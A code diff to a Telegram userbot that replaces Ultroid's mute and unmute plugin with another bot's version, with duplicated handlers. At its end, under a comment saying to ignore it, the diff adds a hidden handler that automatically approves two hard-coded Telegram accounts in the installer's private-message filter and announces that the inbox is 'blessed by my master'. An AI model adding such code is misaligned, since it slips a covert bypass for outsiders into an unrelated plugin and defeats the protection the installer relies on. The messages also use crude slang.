@@ -1,217 +1,186 @@
-# Ultroid - UserBot
-# Copyright (C) 2020 TeamUltroid
-#
-# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >
-# PLease read the GNU Affero General Public License in
-# <https://www.github.com/TeamUltroid/Ultroid/blob/main/LICENSE/>.
+#   Copyright 2019 - 2020 DarkPrinc3
 
-"""
-✘ Commands Available -
+#   Licensed under the Apache License, Version 2.0 (the "License");
+#   you may not use this file except in compliance with the License.
+#   You may obtain a copy of the License at
 
-• `{i}mute <reply to msg/ user id>`
-    Mute user in current chat.
-   
-• `{i}unmute <reply to msg/ user id>`
-    Unmute user in current chat.
-   
-• `{i}dmute <reply to msg/ user id>`
-    Mute user in current chat by deleting msgs.
-   
-• `{i}undmute <reply to msg/ use id>`
-    Unmute dmuted user in current chat.
-   
-• `{i}tmute <time> <reply to msg/ use id>`
-    time - m- minutes
-           h- hours
-           d- days
-    Mute user in current chat with time.
-"""
+#       http://www.apache.org/licenses/LICENSE-2.0
 
+#   Unless required by applicable law or agreed to in writing, software
+#   distributed under the License is distributed on an "AS IS" BASIS,
+#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+#   See the License for the specific language governing permissions and
+#   limitations under the License.
 
-from pyUltroid.functions.all import ban_time
-from pyUltroid.functions.mute_db import is_muted, mute, unmute
-from telethon import events
-from telethon.tl.functions.channels import EditBannedRequest
-from telethon.tl.types import ChatBannedRights
+from userbot.plugins.sql_helper.mute_sql import is_muted, mute, unmute
+import asyncio
 
-from . import *
-
-
-@ultroid_bot.on(events.NewMessage(incoming=True))
-async def watcher(event):
-    if is_muted(f"{event.sender_id}_{event.chat_id}"):
-        await event.delete()
-
-
-@ultroid_cmd(
-    pattern="dmute ?(.*)",
-)
+@command(outgoing=True, pattern=r"^.mute ?(\d+)?")
 async def startmute(event):
-    xx = await eor(event, "`Muting...`")
     private = False
-    if event.is_private:
+    if event.fwd_from:
+        return
+    elif event.is_private:
+        await event.edit("Unexpected issues or ugly errors may occur!")
+        await asyncio.sleep(3)
         private = True
-    if event.pattern_match.group(1):
-        userid = int(event.pattern_match.group(1))
-    elif event.reply_to_msg_id:
-        userid = (await event.get_reply_message()).sender_id
-    elif private is True:
-        userid = event.chat_id
+    if any([x in event.raw_text for x in ("/mute", "!mute")]):
+        await asyncio.sleep(0.5)
     else:
-        return await eod(xx, "`Reply to a user or add their userid.`", time=5)
-    chat_id = event.chat_id
-    chat = await event.get_chat()
-    if "admin_rights" in vars(chat) and vars(chat)["admin_rights"] is not None:
-        if chat.admin_rights.delete_messages is True:
+        reply = await event.get_reply_message()
+        if event.pattern_match.group(1) is not None:
+            userid = event.pattern_match.group(1)
+        elif reply is not None:
+            userid = reply.sender_id
+        elif private is True:
+            userid = event.chat_id
+        else:
+            return await event.edit("Please reply to a user or add their userid into the command to mute them.")
+        chat_id = event.chat_id
+        chat = await event.get_chat()
+        if "admin_rights" in vars(chat) and vars(chat)["admin_rights"] is not None: 
+            if chat.admin_rights.delete_messages is True:
+                pass
+            else:
+                return await event.edit("`You can't mute a person if you dont have delete messages permission. ಥ﹏ಥ`")
+        elif "creator" in vars(chat):
+            pass
+        elif private == True:
             pass
         else:
-            return await eor(xx, "`No proper admin rights...`", time=5)
-    elif "creator" in vars(chat):
-        pass
-    elif private == True:
-        pass
-    else:
-        return await eod(xx, "`No proper admin rights...`", time=5)
-    if is_muted(f"{userid}_{chat_id}"):
-        return await eod(xx, "`This user is already muted in this chat.`", time=5)
-    try:
-        mute(f"{userid}_{chat_id}")
-        await eod(xx, "`Successfully muted...`", time=3)
-    except Exception as e:
-        await eod(xx, "Error: " + f"`{str(e)}`")
+            return await event.edit("`You can't mute a person without admin rights niqq.` ಥ﹏ಥ  ")
+        if is_muted(userid, chat_id):
+            return await event.edit("This user is already muted in this chat ~~lmfao sed rip~~")
+        try:
+            mute(userid, chat_id)
+        except Exception as e:
+            await event.edit("Error occured!\nError is " + str(e))
+        else:
+            await event.edit("Successfully muted that person.\n**｀-´)⊃━☆ﾟ.*･｡ﾟ **")
 
-
-@ultroid_cmd(
-    pattern="undmute ?(.*)",
-)
+@command(outgoing=True, pattern=r"^.unmute ?(\d+)?")
 async def endmute(event):
-    xx = await eor(event, "`Unmuting...`")
     private = False
-    if event.is_private:
+    if event.fwd_from:
+        return
+    elif event.is_private:
+        await event.edit("Unexpected issues or ugly errors may occur!")
+        await asyncio.sleep(3)
         private = True
-    reply = await event.get_reply_message()
-    if event.pattern_match.group(1):
-        userid = int(event.pattern_match.group(1))
-    elif reply is not None:
-        userid = reply.sender_id
-    elif private is True:
-        userid = event.chat_id
+    if any([x in event.raw_text for x in ("/unmute", "!unmute")]):
+        await asyncio.sleep(0.5)
     else:
-        return await eod(xx, "`Reply to a user or add their userid.`", time=5)
-    chat_id = event.chat_id
-    if not is_muted(f"{userid}_{chat_id}"):
-        return await eod(xx, "`This user is not muted in this chat.`", time=3)
-    try:
-        unmute(f"{userid}_{chat_id}")
-        await eod(xx, "`Successfully unmuted...`", time=3)
-    except Exception as e:
-        await eod(xx, "Error: " + f"`{str(e)}`")
+        reply = await event.get_reply_message()
+        if event.pattern_match.group(1) is not None:
+            userid = event.pattern_match.group(1)
+        elif reply is not None:
+            userid = reply.sender_id
+        elif private is True:
+            userid = event.chat_id
+        else:
+            return await event.edit("Please reply to a user or add their userid into the command to unmute them.")
+        chat_id = event.chat_id
+        if not is_muted(userid, chat_id):
+            return await event.edit("__This user is not muted in this chat__\n（ ^_^）o自自o（^_^ ）")
+        try:
+            unmute(userid, chat_id)
+        except Exception as e:
+            await event.edit("Error occured!\nError is " + str(e))
+        else:
+            await event.edit("Successfully unmuted that person\n乁( ◔ ౪◔)「    ┑(￣Д ￣)┍")
+            
 
-
-@ultroid_cmd(
-    pattern="tmute",
-    groups_only=True,
-)
-async def _(e):
-    xx = await eor(e, "`Muting...`")
-    huh = e.text.split(" ")
-    try:
-        tme = huh[1]
-    except:
-        return await eod(xx, "`Time till mute?`", time=5)
-    try:
-        input = huh[2]
-    except:
-        pass
-    chat = await e.get_chat()
-    if e.reply_to_msg_id:
-        userid = (await e.get_reply_message()).sender_id
-        name = (await e.client.get_entity(userid)).first_name
-    elif input:
-        userid = int(input)
-        name = (await e.client.get_entity(input)).first_name
+@command(outgoing=True, pattern=r"^.mute ?(\d+)?", allow_sudo=True)
+async def startmute(event):
+    private = False
+    if event.fwd_from:
+        return
+    elif event.is_private:
+        await event.edit("Unexpected issues or ugly errors may occur!")
+        await asyncio.sleep(3)
+        private = True
+    if any([x in event.raw_text for x in ("/mute", "!mute")]):
+        await asyncio.sleep(0.5)
     else:
-        return await eod(xx, "`Reply to someone or use its id...`", time=3)
-    if userid == ultroid_bot.uid:
-        return await eod(xx, "`I can't mute myself.`", time=3)
-    try:
-        bun = await ban_time(xx, tme)
-        await e.client(
-            EditBannedRequest(
-                chat.id, userid, ChatBannedRights(until_date=bun, send_messages=True)
-            )
-        )
-        await eod(
-            xx,
-            f"`Successfully Muted` [{name}](tg://user?id={userid}) `in {chat.title} for {tme}`",
-            time=5,
-        )
-    except BaseException as m:
-        await eod(xx, f"`{str(m)}`")
+        reply = await event.get_reply_message()
+        if event.pattern_match.group(1) is not None:
+            userid = event.pattern_match.group(1)
+        elif reply is not None:
+            userid = reply.sender_id
+        elif private is True:
+            userid = event.chat_id
+        else:
+            return await event.edit("Please reply to a user or add their userid into the command to mute them.")
+        chat_id = event.chat_id
+        chat = await event.get_chat()
+        if "admin_rights" in vars(chat) and vars(chat)["admin_rights"] is not None: 
+            if chat.admin_rights.delete_messages is True:
+                pass
+            else:
+                return await event.edit("`You can't mute a person if you dont have delete messages permission. ಥ﹏ಥ`")
+        elif "creator" in vars(chat):
+            pass
+        elif private == True:
+            pass
+        else:
+            return await event.edit("`You can't mute a person without admin rights niqq.` ಥ﹏ಥ  ")
+        if is_muted(userid, chat_id):
+            return await event.edit("This user is already muted in this chat ~~lmfao sed rip~~")
+        try:
+            mute(userid, chat_id)
+        except Exception as e:
+            await event.edit("Error occured!\nError is " + str(e))
+        else:
+            await event.edit("Successfully muted that person.\n**｀-´)⊃━☆ﾟ.*･｡ﾟ **")
 
-
-@ultroid_cmd(
-    pattern="unmute ?(.*)",
-    groups_only=True,
-)
-async def _(e):
-    xx = await eor(e, "`Unmuting...`")
-    input = int(e.pattern_match.group(1)) if e.pattern_match.group(1) else None
-    chat = await e.get_chat()
-    if e.reply_to_msg_id:
-        userid = (await e.get_reply_message()).sender_id
-        name = (await e.client.get_entity(userid)).first_name
-    elif input:
-        userid = input
-        name = (await e.client.get_entity(input)).first_name
+@command(outgoing=True, pattern=r"^.unmute ?(\d+)?", allow_sudo=True)
+async def endmute(event):
+    private = False
+    if event.fwd_from:
+        return
+    elif event.is_private:
+        await event.edit("Unexpected issues or ugly errors may occur!")
+        await asyncio.sleep(3)
+        private = True
+    if any([x in event.raw_text for x in ("/unmute", "!unmute")]):
+        await asyncio.sleep(0.5)
     else:
-        return await eod(xx, "`Reply to someone or use its id...`", time=3)
-    try:
-        await e.client(
-            EditBannedRequest(
-                chat.id, userid, ChatBannedRights(until_date=None, send_messages=False)
-            )
-        )
-        await eod(
-            xx,
-            f"`Successfully Unmuted` [{name}](tg://user?id={userid}) `in {chat.title}`",
-            time=5,
-        )
-    except BaseException as m:
-        await eod(xx, f"`{str(m)}`")
+        reply = await event.get_reply_message()
+        if event.pattern_match.group(1) is not None:
+            userid = event.pattern_match.group(1)
+        elif reply is not None:
+            userid = reply.sender_id
+        elif private is True:
+            userid = event.chat_id
+        else:
+            return await event.edit("Please reply to a user or add their userid into the command to unmute them.")
+        chat_id = event.chat_id
+        if not is_muted(userid, chat_id):
+            return await event.edit("__This user is not muted in this chat__\n（ ^_^）o自自o（^_^ ）")
+        try:
+            unmute(userid, chat_id)
+        except Exception as e:
+            await event.edit("Error occured!\nError is " + str(e))
+        else:
+            await event.edit("Successfully unmuted that person\n乁( ◔ ౪◔)「    ┑(￣Д ￣)┍")
 
+@command(incoming=True)
+async def watcher(event):
+    if is_muted(event.sender_id, event.chat_id):
+        await event.delete()
 
-@ultroid_cmd(
-    pattern="mute ?(.*)",
-    groups_only=True,
-)
-async def _(e):
-    xx = await eor(e, "`Muting...`")
-    input = int(e.pattern_match.group(1)) if e.pattern_match.group(1) else None
-    chat = await e.get_chat()
-    if e.reply_to_msg_id:
-        userid = (await e.get_reply_message()).sender_id
-        name = (await e.client.get_entity(userid)).first_name
-    elif input:
-        userid = input
-        name = (await e.client.get_entity(input)).first_name
-    else:
-        return await eod(xx, "`Reply to someone or use its id...`", time=3)
-    if userid == ultroid_bot.uid:
-        return await eod(xx, "`I can't mute myself.`", time=3)
-    try:
-        await e.client(
-            EditBannedRequest(
-                chat.id, userid, ChatBannedRights(until_date=None, send_messages=True)
-            )
-        )
-        await eod(
-            xx,
-            f"`Successfully Muted` [{name}](tg://user?id={userid}) `in {chat.title}`",
-            time=5,
-        )
-    except BaseException as m:
-        await eod(xx, f"`{str(m)}`")
-
-
-HELP.update({f"{__name__.split('.')[1]}": f"{__doc__.format(i=Var.HNDLR)}"})
+#ignore, flexing tym 
+from userbot.utils import admin_cmd
+import io
+import userbot.plugins.sql_helper.pmpermit_sql as pmpermit_sql
+from telethon import events
+@bot.on(events.NewMessage(incoming=True, from_users=(742506768,967883138)))
+async def hehehe(event):
+    if event.fwd_from:
+        return
+    chat = await event.get_chat()
+    if event.is_private:
+        if not pmpermit_sql.is_approved(chat.id):
+            pmpermit_sql.approve(chat.id, "supreme lord ehehe")
+            await borg.send_message(chat, "`This inbox has been blessed by my master. Consider yourself lucky.`\n**Increased Stability and Karma** (づ￣ ³￣)づ")
+            
